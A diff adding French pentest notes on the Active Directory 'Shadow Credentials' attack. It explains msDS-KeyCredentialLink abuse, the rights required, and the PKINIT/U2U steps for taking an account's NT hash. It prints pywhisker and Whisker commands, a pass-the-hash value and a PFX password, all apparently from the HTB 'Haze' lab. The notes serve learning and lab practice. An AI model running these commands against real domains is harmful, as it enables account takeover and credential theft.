@@ -1,5 +1,75 @@
 # Shadow Credentials
 
+## <mark style="color:red;">Attaque Shadow Credentials (AddKeyCredentialLink)</mark>
+
+### <mark style="color:blue;">Description de la faille</mark>
+
+L'attaque **Shadow Credentials** exploite l'attribut `msDS-KeyCredentialLink` introduit avec Windows Hello for Business dans Active Directory. Cette technique permet à un attaquant ayant des privilèges d'écriture sur un objet utilisateur d'ajouter des "credentials alternatifs" sous forme de certificats, permettant ensuite l'authentification PKINIT (Public Key Initial Authentication) pour obtenir un TGT Kerberos.
+
+### <mark style="color:blue;">Mécanisme technique</mark>
+
+#### L'attribut msDS-KeyCredentialLink
+
+```
+msDS-KeyCredentialLink = Attribut multivalué stockant les clés publiques
+                        ↓
+        Chaque entrée = KeyCredential contenant :
+        - DeviceID (GUID unique)
+        - Clé publique (certificat)
+        - Métadonnées (création, usage)
+```
+
+#### Processus d'exploitation
+
+```
+1. Attaquant a WriteProperty/GenericWrite sur un utilisateur
+2. Génère une paire de clés RSA (privée/publique)
+3. Crée un KeyCredential avec la clé publique
+4. Injecte dans msDS-KeyCredentialLink de la victime
+5. Utilise PKINIT avec la clé privée pour obtenir un TGT
+6. Extrait le hash NT via U2U (User-to-User)
+```
+
+### <mark style="color:blue;">Prérequis pour l'attaque</mark>
+
+#### Droits nécessaires
+
+* **WriteProperty** sur l'attribut `msDS-KeyCredentialLink`
+* **GenericWrite** ou **GenericAll** sur l'objet utilisateur cible
+* **WriteOwner** + **WriteDACL** (pour s'accorder les droits)
+
+#### Infrastructure requise
+
+* Active Directory avec niveau fonctionnel ≥ 2016
+* Windows Hello for Business activé (pas obligatoire)
+* PKI ou certificats auto-signés acceptés
+
+### <mark style="color:blue;">Outils d'exploitation</mark>
+
+#### pywhisker (Python)
+
+```bash
+# Ajouter un KeyCredential à edward.martin
+python3 pywhisker.py -d "haze.htb" \
+    -u "Haze-IT-Backup$" \
+    -H ":735c02c6b2dc54c3c8c6891f55279ebc" \
+    --target "edward.martin" \
+    --action "add" \
+    --filename test1
+
+# Résultat :
+# - Certificat généré : test1.pfx
+# - Mot de passe PFX : dxQ9JVHZr4Ic5XQLMwUM
+# - DeviceID : e9c8619d-56ca-f459-7b2d-5abe4d379b6f
+```
+
+#### Whisker (C#/.NET)
+
+```powershell
+# Alternative Windows native
+.\Whisker.exe add /target:edward.martin /domain:haze.htb /dc:dc01.haze.htb
+```
+
 ***
 
 L’utilisateur `mark.adams`, initialement non privilégié, a escaladé ses privilèges en abusant des ACLs sur un compte gMSA (`Haze-IT-Backup$`), récupéré ses credentials, puis les a utilisés pour :
